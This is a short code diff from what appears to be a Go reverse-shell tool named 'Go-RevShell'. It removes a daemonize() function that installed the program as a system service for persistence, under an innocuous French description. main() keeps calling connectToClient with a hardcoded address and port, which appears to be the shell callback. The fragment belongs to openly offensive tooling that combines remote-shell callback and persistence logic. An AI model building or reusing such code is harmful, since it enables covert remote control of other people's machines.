@@ -9,8 +9,6 @@ import (
 	"strconv"
 	"strings"
 	"time"
-
-	"github.com/takama/daemon"
 )
 
 const banner string = `
@@ -23,15 +21,7 @@ const banner string = `
 `
 
 func main() {
-	// daemonize()
 	connectToClient("192.168.1.24", 1111)
-}
-
-func daemonize() {
-	service, err := daemon.New("Go-RevShell", "Une tortue sur son dos", daemon.SystemDaemon)
-	handleError(err)
-	_, err = service.Install()
-	handleError(err)
 }
 
 func connectToClient(host string, port int) {
